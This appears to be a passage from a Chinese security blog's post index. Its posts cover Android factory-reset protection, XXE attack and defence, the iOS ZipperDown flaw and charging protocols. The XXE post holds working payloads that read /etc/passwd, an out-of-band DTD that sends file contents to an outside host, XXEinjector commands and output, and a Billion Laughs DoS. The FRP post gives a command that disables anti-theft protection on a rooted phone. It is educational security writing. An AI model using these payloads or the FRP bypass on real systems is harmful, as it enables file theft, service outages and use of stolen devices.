    <content type="text"><![CDATA[简介最近在对华为P10刷机时，发现解锁bootloader需要关闭“查找我的手机“功能，此外，解锁bootloader后刷recovery时，仍然需要关闭“查找我的手机”才能进行，这种现象表明了Android主系统可以操作bootloader和recovery分区，一番查找后，发现这个功能叫做FRP（Factory Reset Protection）,自Android 5.0后引入，为了防止手机被盗后被刷机而引入的一种保护机制。 FRP工作机制我们假设手机被盗取后的几个场景来分析： 一、手机有锁屏密码，盗取者无法进入主系统方案1：盗取者为了使用该设备，此时，很容易想到进入recovery模式去恢复出厂设置，即使这样，原机主的设备在reset后数据被清除，但重启后再次进入系统前，FRP保护开始工作，要求输入原设备绑定的账号解锁。如下是在华为手机上做的实验： 方案2：既然原设备的recovery有检查，那盗取者可以刷第三方的recovery,此时便需要解锁bootloader。然而，随着很多手机厂商都不提供解锁bootloader服务，仅仅是解锁bootloader就很困难了，我们再假设盗取者有解锁bootloader的能力，然而FRP又发挥了作用，在bootloader中设置了一个标记位，只有这个标记位置零时才允许解锁bootloader。同样道理，即使完成了解锁bootloader这一关，刷第三方recovery时依然受到FRP保护。 两种方案都失败了，对于盗取者来说，只能眼睁睁看着设备卖废铁了，所以FRP作用还是挺大的。 二、无锁屏密码或被破解，盗取者可以进入主系统这个时候就比较尴尬了，失主的数据当然一览无余，但盗取者可能有三种操作： 关闭FRP保护 添加一个自己的账户或删除原机主账户 在设置中恢复出厂设置这三种操作无论哪一个，都需要输入原账户的口令进行验证。 当然，如果知道原账户的账号，我可以重置密码，毕竟能进主系统就可以收验证码。但google的账户要求在重置72小时后才能关闭FRP，这期间失主可以对手机进行远程擦除或锁定。国内的其他厂商应该也有一些保护机制，但不代表可以万无一失，不过由此看来设置锁屏密码还是非常重要的。 根据上述两个场景，总结FRP的功能如下： 只要有google账户（第三方厂商也可以），有网络，就可以远程通过Android Device Manager(ADM)锁屏 frp打开后，如下操作会提示密码：在主用户上添加google账户；删除最后一个google账户 frp打开后，只有在Settings下做factory reset才会清除reset token，重新打开setup wizard（设置向导）时才不需要密码 (trusted factory reset) frp打开后，bootloader下或者ADM下做factory reset不会清除reset token，重新打开setup wizard时会提示输入密码。 (untrusted factory reset), 只要输入的账户/密码符合之前任意一个google账户即可。 代码分析Android中FRP实现主要在以下几个文件中： IPersistentDataBlockService.aidlhttps://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/service/persistentdata/IPersistentDataBlockService.aidl PersistentDataBlockManager.javahttps://android.googlesource.com/platform/frameworks/base/+/1c4d535d0806dbeb6d2fa5cea0373cbd9ab6d33b/core/java/android/service/persistentdata/PersistentDataBlockManager.java PersistentDataBlockService.javahttps://android.googlesource.com/platform/frameworks/base.git/+/master/services/core/java/com/android/server/PersistentDataBlockService.java com_android_server_PersistentDataBlockService.cpphttps://android.googlesource.com/platform/frameworks/base/+/master/services/core/jni/com_android_server_PersistentDataBlockService.cpp 当创建有一个账户时，FRP会创建一个重置的标志位和key保存在这个block里面，可以用通过其他的android设备登陆你的google账户定位或者锁定，远程清空手机，回复出场设置等。 FRP在bootloader分区的最后一个字节用于信号标记，如果字节为0，OEM-UNLOCK位DISABLE。即，当此字节设置为0，fastboot oem unlock应该失败。enable/disbale OEM-UNLOCK只能通过PersistentDataBlockManager这个API来更改（相当于更改分区最后1个byte）。 FRP对应一个Account Data Blocks用来存放key，其实就是一个独立的存储分区（500kb - 2M），通过系统中的ro.frp.pst来指定该分区的路径：12ro.frp.pst=/dev/block/platform/sdhci-tegra.3/by-name/PSTro.frp.pst=/dev/block/platform/msm_sdcc.1/by-name/frp 对其的读写操作是通过API——android.service.persistentdata.PersistentDataBlockManager来操作的，当然操作需要特殊的权限，具体在代码中有解释。 这部分代码的核心其实就是读写操作，例如PersistentDataBlockService#wipe(),实际上就是ioctl(fd, BLKSECDISCARD, &amp;range)。 FRP漏洞 Nexus 6 重置后利用设置向导的漏洞进入系统https://www.androidauthority.com/factory-reset-protection-bypass-nexus-marshmallow-680580/ Huawei安全公告上一个FRP绕过（未公开）https://www.huawei.com/en/psirt/security-advisories/huawei-sa-20170524-01-frp-en 事实上，我在一部root的手机上am broadcast -a “com.huawei.remotecontrol.OFF_REMOTE”就可以关闭FRP，无需输入账号验证，因此这里可能存在什么问题，后续待研究。 参考资料 Help prevent others from using your device without permission https://blog.csdn.net/woshing123456/article/details/44524051 https://www.androidpolice.com/2015/03/12/guide-what-is-android-5-1s-antitheft-device-protection-feature-and-how-do-i-use-it/ http://cfig.github.io/2017/12/20/Android-Factory-Reset-Protection-FRP/]]></content>
  </entry>
  <entry>
    <title><![CDATA[XXE漏洞攻击和防御]]></title>
    <url>%2F2018%2F07%2F03%2FXXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[一、简介近期微信支付SDK爆出了一个严重的XXE漏洞（http://seclists.org/fulldisclosure/2018/Jul/3），可导致商家服务器上的文件被窃取。 XXE (XML External Entity Injection) 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。在web上愈来愈少，但在一些大家不容易想到的地方还是存在很多，例如之前apktool工具爆出的XXE漏洞用来攻击APK分析人员。 二、漏洞原理XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 DTD（文档类型定义）DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 内部声明DTD 1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD123&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;//或者&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt; DTD文档中有很多重要的关键字如下： - DOCTYPE（DTD的声明） - ENTITY（实体的声明） - SYSTEM、PUBLIC（外部资源申请） ENTITY（实体）实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 根据引用方式，实体可分为内部实体、外部实体、参数实体。完整的实体类别可参考 DTD - Entities（https://www.tutorialspoint.com/dtd/dtd_entities.htm） 内部实体 1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 外部实体 1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体 123&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt; 注意：参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。 参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 以下为一个xml实例： 1.name为内部实体，引用时用的\&amp;name,在xml文档中引用 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt; &lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt; 2.name为参数实体，声明和引用都使用%，且都在DTD中 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt; %name;]&gt; 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体引用在DTD中使用外部实体即1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; URL主要有file、http、https、ftp等等，不同的程序支持URI的不一样： 外部实体引用实例：123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt; 由于引用了外部实体，这里的URI可以是 http链接、file://本地文件引用等，因此可以加载http指向的资源和本地文件，导致出现了XML解析的安全问题。 三、攻击XXE的攻击场景或条件 解析外部提供的XML数据 未禁用外部实体引用 解析完xml后返回（非必要） XXE攻击演示服务端代码：123456789101112131415&lt;?php//允许加载外部实体libxml_disable_entity_loader(false);//获取xml数据$xmlfile = file_get_contents(&quot;php://input&quot;);//解析并回显$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);$user = $creds-&gt;user;$pass = $creds-&gt;pass;echo &quot;user is $user&quot;;?&gt; 攻击代码：12345678910POST http://192.168.1.28/xxetest.php&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt; bind XXE(对于没有回显的情况利用参数实体)攻击代码：1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.17:80/file.dtd&quot;&gt;%remote;%int;%send;]&gt;&lt;foo&gt;&lt;/foo&gt; 外部 DTD 文件 http://192.168.1.17:80/file.dtd 内容：12&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send system &apos;http://192.168.1.17:80/?p=%file;&apos;&gt;&quot;&gt; 因为实体的值中不能有 %, 所以将其转成html实体编码 上述过程分析： 首先 %remote; 加载 外部 DTD 文件，得到：12&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send system &apos;http://192.168.1.17:80/?p=%file;&apos;&gt;&quot;&gt; %int;%send;接着 %int; 获取对应实体的值，因为值中包含实体引用 %file;, 即 /etc/hosts 文件的内容，得到:123&lt;!ENTITY &amp;#37; send system &apos;http://192.168.1.17:80/?p=[文件内容]&apos;&gt;%send; 最后 %send; 获取对应实体的值，会去请求对应 URL 的资源，通过查看访问日志即可得到文件内容，当然这里还需要对内容进行编码，防止XML解析出错. XXEinjector比较成熟的工具（https://github.com/enjoiz/XXEinjector） XXEinjector使用 burp 获取原始正常的请求1curl -d @xml.txt http://192.168.1.28/xmlinject.php --proxy http://127.0.0.1:8081 xml.txt 内容1234567891011121314151617&lt;creds&gt; &lt;user&gt;Ed&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;burp中获取到的请求信息POST /xmlinject.php HTTP/1.1Host: 192.168.1.28User-Agent: curl/7.43.0Accept: */*Content-Length: 57Content-Type: application/x-www-form-urlencoded&lt;creds&gt; &lt;user&gt;Ed&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt; 在需要注入 DTD 的地方加入 XXEINJECT，然后保存到 phprequest.txt，XXEinjector 需要根据原始请求来进行获取文件内容的操作123456789101112POST /xmlinject.php HTTP/1.1Host: 192.168.1.28User-Agent: curl/7.43.0Accept: */*Content-Length: 57Content-Type: application/x-www-form-urlencodedXXEINJECT&lt;creds&gt; &lt;user&gt;Ed&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt; 运行 XXEinjector1sudo ruby XXEinjector.rb --host=192.168.1.17 --path=/etc/hosts --file=phprequest.txt --proxy=127.0.0.1:8081 --oob=http --verbose --phpfilter 参数说明123456host: 用于反向连接的 IPpath: 要读取的文件或目录file: 原始有效的请求信息，可以使用 XXEINJECT 来指出 DTD 要注入的位置proxy: 代理服务器，这里使用burp，方便查看发起的请求和响应oob：使用的协议，支持 http/ftp/gopher，这里使用httpphpfilter：使用 PHP filter 对要读取的内容进行 base64 编码，解决传输文件内容时的编码问题 运行后会输出 payload 和 引用的 DTD 文件1234567891011121314151617181920212223XXEinjector git:(master) sudo ruby XXEinjector.rb --host=192.168.1.17 --path=/etc/hosts --file=phprequest.txt --proxy=127.0.0.1:8081 --oob=http --verbose --phpfilterPassword:XXEinjector by Jakub PałaczyńskiDTD injected.Enumeration locked.Sending request with malicious XML:http://192.168.1.28:80/xmlinject.php&#123;&quot;User-Agent&quot;=&gt;&quot;curl/7.43.0&quot;, &quot;Accept&quot;=&gt;&quot;*/*&quot;, &quot;Content-Length&quot;=&gt;&quot;159&quot;, &quot;Content-Type&quot;=&gt;&quot;application/x-www-form-urlencoded&quot;&#125;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.17:80/file.dtd&quot;&gt;%remote;%int;%trick;]&gt;&lt;creds&gt; &lt;user&gt;Ed&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;Got request for XML:GET /file.dtd HTTP/1.0Responding with XML for: /etc/hostsXML payload sent:&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/hosts&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://192.168.1.17:80/?p=%payl;&apos;&gt;&quot;&gt; payload为1&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.17:80/file.dtd&quot;&gt;%remote;%int;%trick;]&gt; DTD文件为12&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/hosts&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://192.168.1.17:80/?p=%payl;&apos;&gt;&quot;&gt; 成功获取到文件12345Response with file/directory content received:GET /?p=MTI3LjAuMC4xCWxvY2FsaG9zdAoxMjcuMC4xLjEJa2FsaQoKIyBUaGUgZm9sbG93aW5nIGxpbmVzIGFyZSBkZXNpcmFibGUgZm9yIElQdjYgY2FwYWJsZSBob3N0cwo6OjEgICAgIGxvY2FsaG9zdCBpcDYtbG9jYWxob3N0IGlwNi1sb29wYmFjawpmZjAyOjoxIGlwNi1hbGxub2RlcwpmZjAyOjoyIGlwNi1hbGxyb3V0ZXJzCg== HTTP/1.0Enumeration unlocked.Successfully logged file: /etc/hosts 在Logs目录下有详细的数据。 XXE漏洞利用1.窃取文件 有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击 2.RCE（配合其他问题） 安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。 3.内网渗透端口探测，内网请求等 XXE案例1.微信支付SDK参考：http://seclists.org/fulldisclosure/2018/Jul/3 反例：https://my.oschina.net/kmwzjs/blog/608501?fromerr=DzDfNIhd 2.apktool xxe漏洞参考：https://security.tencent.com/index.php/blog/msg/122 3.绕过技巧 XML其他类型漏洞1. DoS a和b递归调用 xml炸弹(Billion Laughs Attack) 12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; xml炸弹（Reference a large file） 1234&lt;!DOCTYPE data [&lt;!ENTITY dos SYSTEM &quot;http:///somesite.com/largefile.xml&quot;&gt;]&gt;&lt;data&gt;&amp;dos;&lt;/data&gt; 四、防御1.使用开发语言提供的禁用外部实体的方法PHP：1libxml_disable_entity_loader(true); JAVA:12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python：12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2.过滤用户提交的XML数据过滤关键词：DOCTYPE和ENTITY，或者SYSTEM和PUBLIC。 五、Android上的XXE?1.DocumentBuilderFactory在java中默认允许加载外部实体，DocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true)之后不会加载外部实体。但同样代码在Android上默认不允许加载，setFeature强制设为false失败。 官方文档中明确说明可以设置FEATURE_SECURE_PROCESSING，但实际代码不可以 参考：官方文档https://developer.android.com/reference/javax/xml/parsers/DocumentBuilderFactory#setFeature(java.lang.String,boolean)实际代码：https://android.googlesource.com/platform/libcore/+/master/luni/src/main/java/org/apache/harmony/xml/parsers/DocumentBuilderFactoryImpl.java#90 2.XmlPullParserXmlPullParser是官方文档推荐的xml解析工具，但Android 代码中禁止了外部实体。 早期的KxmlParser和ExpatPullParser是Android早期的xml解析包，后来进行了改动，和XmlPullParser本质上调用的同一套代码。 通过跟踪XmlPullParserFactory发现其最终调用的KXmlParser来解析，（http://androidxref.com/7.1.2_r36/xref/libcore/xml/src/main/java/org/kxml2/io/KXmlParser.java#925），而KXmlParser对于带SYSTEM和PUBLIC两种形式的实体强制置为了empty string。 参考：https://android.googlesource.com/platform/libcore-snapshot/+/ics-mr1/luni/src/test/java/libcore/xml/PullParserDtdTest.java http://androidxref.com/7.1.2_r36/xref/libcore/xml/src/main/java/org/xmlpull/v1/XmlPullParser.java 3. SAXParserFactory不支持参数实体 Hint Android不存在XXE? Bypass? XXE多存在于PC平台，开发者并不知情，默认开启的最严重 APP中的xml流量？Burpsuit Fuzz ？ 参考文档 https://security.tencent.com/index.php/blog/msg/69 https://thief.one/2017/06/20/1/ https://b1ngz.github.io/XXE-learning-note/ 全平台的xml漏洞分析 https://www.usenix.org/system/files/conference/woot16/woot16-paper-spath.pdf android解析XML总结（SAX、Pull、Dom三种方式） http://www.cnblogs.com/JerryWang1991/archive/2012/02/24/2365507.html XML External Entity (XXE) Prevention Cheat Sheet https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#XMLReader]]></content>
  </entry>
  <entry>
    <title><![CDATA[iOS应用安全 —— ZipperDown漏洞]]></title>
    <url>%2F2018%2F07%2F01%2FiOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-ZipperDown%2F</url>
    <content type="text"><![CDATA[简介ZipperDown是盘古实验室公布的一个由目录穿越导致RCE的漏洞，根据盘古的检测，发现约10%的iOS应用可能受此漏洞的影响。经过手工分析，确认微博、陌陌、网易云音乐、QQ音乐、快手等流行应用受影响。 漏洞原理 iOS平台没有提供官方解压类库，所以开发中往往引用第三方库来实现解压功能； 由于现有的iOS App基本上采用SSZipArchive或Ziparchive来实现解压，因此漏洞是来自使用第三方Zip库解压Zip文件的过程中没有对Zip内文件名做校验导致的； 例如 SSZipArchive解压时会吧文件名直接拼接到目标路径后面，如果文件名中含有“../”则可以实现目录的上一级跳转，从而实现应用内任意目录的跳转，进一步可以实现文件覆盖； 如果把App的热修复hotpatch文件覆盖替换了，可以达到执行黑客指定指令，从而按照黑客的意图实现任意应用内攻击。 攻击条件 使用了SSZipArchive或Ziparchive第三方解压库; Zip包在解压时没有做完整性校验; 文件名中包含../等路径特殊符号，解压时没有对文件名过滤处理; 使用了JSPatch或其他热修复库，且本地脚本没有加密等安全处理; 连接不可靠的WIFI热点或者网络被人劫持。 漏洞分析iOS平台的两个解压缩库（SSZipArchive和ZipArchive）在解压缩过程中没有考虑到文件名中包含”../”的情况，造成了文件释放过程中路径穿越，导致恶意Zip文件可以在App沙盒范围内，覆盖任意可写文件。具体代码如下： ZipArchive相关代码1234567891011121314151617-(BOOL) UnzipFileTo:(NSString*) path overWrite:(BOOL) overwrite&#123; [...] // check if it contains directory NSString* strPath = [NSString stringWithCString:filename encoding:NSUTF8StringEncoding]; BOOL isDirectory = NO; if( filename[fileInfo.size_filename-1]==&apos;/&apos; || filename[fileInfo.size_filename-1]==&apos;\\&apos;) isDirectory = YES; free( filename ); if( [strPath rangeOfCharacterFromSet:[NSCharacterSetcharacterSetWithCharactersInString:@&quot;/\\&quot;]].location!=NSNotFound ) &#123; // contains a path strPath = [strPath stringByReplacingOccurrencesOfString:@&quot;\\&quot; withString:@&quot;/&quot;]; &#125; NSString* fullPath = [path stringByAppendingPathComponent:strPath]; [...]&#125; SSZipArchive相关代码1234567891011121314151617+ (BOOL)unzipFileAtPath:(NSString *)path toDestination:(NSString *)destination preserveAttributes:(BOOL)preserveAttributes overwrite:(BOOL)overwrite nestedZipLevel:(NSInteger)nestedZipLevel password:(nullable NSString *)password error:(NSError **)error delegate:(nullable id)delegate progressHandler:(void (^_Nullable)(NSString *entry, unz_file_info zipInfo, long entryNumber, long total))progressHandler completionHandler:(void (^_Nullable)(NSString *path, BOOL succeeded, NSError * _Nullable error))completionHandler&#123; [...] if ([strPath rangeOfCharacterFromSet:[NSCharacterSetcharacterSetWithCharactersInString:@&quot;/\\&quot;]].location != NSNotFound) &#123; strPath = [strPath stringByReplacingOccurrencesOfString:@&quot;\\&quot; withString:@&quot;/&quot;]; &#125; NSString *fullPath = [destination stringByAppendingPathComponent:strPath]; [...]&#125; 基于以上漏洞原理，漏洞利用条件的核心即如何使目标App解压不可信Zip文件，iOS应用的主要解压场景如下： App直接接收不可信Zip文件，并使用SSZipArchive/ZipArchive（或其它存在路径穿越问题的代码）解压。例如聊天应用、文件管理应用中可能存在这类业务场景。 App通过HTTP下载Zip文件，使用SSZipArchive/ZipArchive（或其它存在路径穿越问题的代码）解压。在这种场景下，攻击者可以通过流量劫持等途径，将正常Zip文件替换为恶意Zip文件，在App中实现文件覆盖。 完成文件覆盖后，一些特殊场景可以实现RCE,例如： 覆盖了热补丁文件，APP加载恶意热补丁实现RCE 覆盖了APP的核心文件，实现钓鱼、拒绝服务等 先前的微信、企业微信等都是因为存在ZipperDown问题，导致最后账户被克隆。 另外，由于iOS沙盒保护，ZipperDown的破坏范围仅限在App环境中。 参考资料： ZipperDown https://zipperdown.org/ https://github.com/muzipiao/ZipperDownDemo]]></content>
  </entry>
  <entry>
    <title><![CDATA[关于手机充电器 - 充电协议]]></title>
    <url>%2F2018%2F06%2F27%2F%E5%85%B3%E4%BA%8E%E6%89%8B%E6%9C%BA%E5%85%85%E7%94%B5%E5%99%A8%2F</url>
    <content type="text"><![CDATA[简介目前市面上充斥着各种诸如“充电1分钟，通话2小时”的宣传，手机快速充电成为手机厂商们追逐的一个技术指标。常见的标准充电装置通常为5V/1A 或 5V/2A，快速充电意味着要在电流或电压上有所提高，于是就出现了如QC、PD等各式各样的充电协议，本文作一个简单介绍。 几个关键知识点： MicroUSB最大支持电流为2A,TYPE-C口最多支持5A PD协议是谷歌和USB-IF推出的，QC是高通推出的 PD 3.0收编了QC 4.0,PD可能会成为主流,谷歌已经强制安卓阵营使用USB接口就必须支持PD协议 所有用来充电的type-c接口都支持pd2.0协议吗？并不是，type-c只是接口形状，支持的协议各不相同。 充电要考虑的问题一、电池的接受能力充电本质上就是“喂饱电池”，目前市面上比较流行的iphone x，华为P9，小米note等，电池容量都不超过3000mAH，按照4.35V作为最高电压，1.5C（C为充电或放电倍率，对于3000mAh的电池1.5C电流就是4500mA）充电来看，最大可能接受的充电功率约为20W（4.35V*4.5A约等于20W），当然，这是极限情况。除了功率接收能力，还要涉及到电流接受能力。在1.5C充电时，3000mAH的电池充电电流将达到4.5A，因此，电池触点和电芯内部的电流传输结构都要进行必要的优化。 二、适配器的功率提供能力在不考虑接口承受能力的情况下，20W功率对适配器来说是轻而易举。但是传统的MicroUSB接口，在标准规范里面最大电流承载能力是2A，最高电压是5.25V。仅仅有10.5W，无法达到20W的要求。怎么解决这个问题呢？显然有两种解决方案，增大电流，或者提升电压。 如果不改动物理接口，增大电流是不可能的选项，所以，提升电压，是MicroUSB时代的唯一选项，这就是高通QC快速充电方法的由来。所以，我们可以看到，1.5A是QC标准比较推荐的电流，因为2A是MicroUSB的极限，业界的普遍共识是，不要把器件用到极限值，而是要预留余量。在这方面，OPPO与高通走了相反的道路，他们给MicroUSB在物理上打了补丁，增加了额外的接触针，专门用来传输大电流。最大充电电流达到了4.5A，但是电压维持在5V不变。同样达到了超过20W的功率传输。而Type-C接口的出现，让这个问题不再存在，因为TYPE-C口最高支持5A输入电流，完全能够满足现有手机电池的快速充电需求。 三、手机的充电管理及散热能力充电管理，必然涉及到电压变换，恒流控制等环节，带来充电效率的下降和散热问题。因此，理论上最佳的充电设计方案是，手机内部不做充电管理，完全交给外部适配器去控制。在这一点上，QC是比较吃亏的，因为高电压低电流输入，必然导致手机内部要进行能量转换，变为低电压和大电流。这会带来手机散热上的大问题。所以，从技术的角度来看，QC的历史局限性，已经凸显。 更为严重的问题是，TYPE-C接口和USBPD中都严禁采用除USBPD以外的方式来调整充电电压。高通为此做出了很大的努力去说服USB-IF组织，试图在TYPE-C接口中，让QC和PD同时存在。但是，很可惜，被无情的拒绝了，最新的TYPE-C1.2和USBPD3.0维持了关于这一特性的描述。因此，QC不论在技术上还是在理论上，都将面临着被淘汰的危险。当然，高通自身是很清楚这一趋势的。因此，已经在最新的处理器内核中，集成了USBPD的协商功能。 PD协议USB-PD是USB Power Delivery的缩写，PD协议是目前主流的快充协议之一，是由USB-IF组织制定的一种快速充电规范。市面上的苹果三星华为小米谷歌等等比较新的旗舰机，基本都可以兼容PD 3.0。 USB-PD的通信是将协议层的消息调制成24MHZ的FSK信号并耦合到VBUS上或者从VBUS上获得FSK信号来实现手机和充电器通信的过程。http://file.elecfans.com/web1/M00/48/46/pIYBAFqofqCARgD1AAAm--4DcJY458.jpg PD协议和Type C的区别：USBPD是在一条线缆中同时支持高达100W电力传输和数据通信的协议规范，而USB Type-C则是一个全新的正反插USB连接器规范。在USBType-C端口中实现了USBPD，它就能支持USBPD规范中定义的100W功率（5V20A），但拥有USB Type-C端口并不一定意味着它支持USBPD。 PD 3.0收编QC 4.0USB-IF组织发布了USB PD 3.0的重要更新，正式推出旨在一统快速充电技术规范的PPS(Programmable Power Supply)，成功收编了高通的QC4.0，并与国家工信部的泰尔实验室达成了共识，预计将与国标实现统一。 智能手机进入大屏时代，原有的5V2A micro usb充电极限已经无法满足用户的需求。但是，作为USB协议的制定者USB-IF却没有给出解决办法。这为后来的快速充电技术标准混战埋下了伏笔。于是，高通利用自己的行业地位，开始力推QC2.0和QC3.0，向9V/2A, 12V/1.5A快速充电技术路线进发。但是，不同于非盈利组织定位的USB-IF，高通发布的技术标准都是围绕自己的产品生态和商业利益展开的。因此，纷争不可避免，战火从此点燃。OPPO，MTK，华为，TI等公司相继推出了自己的快速充电标准，试图分得一杯羹。于是，USB-IF在原有的USB PD2.0和USB PD3.0基础上，通过与高通、泰尔实验室以及国内主流手机厂商的多方沟通。终于推出了PPS来满足各方的诉求(或者说是互相妥协)，并明确规定，USB接口不允许通过非USB PD的协议来实现电压调整。从此，快速充电标准，有望走向统一。 QC协议Quick Charge，简写QC，又称QC快充，美商高通公司（Qualcomm）骁龙系统芯片（SnapDragon SoC）中的快速充电技术，目前已经由1.0维护到4.0。 https://pic4.zhimg.com/v2-660a3ea029ebe6cc2b7af7f29c7579b7_r.jpg QI协议Qi（发音与命名来自中文字“气”），是一种由无线充电联盟（英语：Wireless Power Consortium，缩写WPC[1]）所制定的短距离（40mm, 1.6英寸[2]）低功率无线感应式电力传输的互连标准，主要目的是提供移动电话手机与其他便携式电子设备便利与通用的无线充电。 参考资料： 充电头网 http://www.chongdiantou.com/ 一文看懂pd协议和qc协议的区别 http://www.elecfans.com/d/647129.html http://www.chongdiantou.com/wp/archives/10209.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[iOS应用安全 —— WebView安全]]></title>
    <url>%2F2018%2F06%2F25%2FiOS%E5%BA%94%E7%94%A8%E6%B2%99%E7%AE%B1%2F</url>
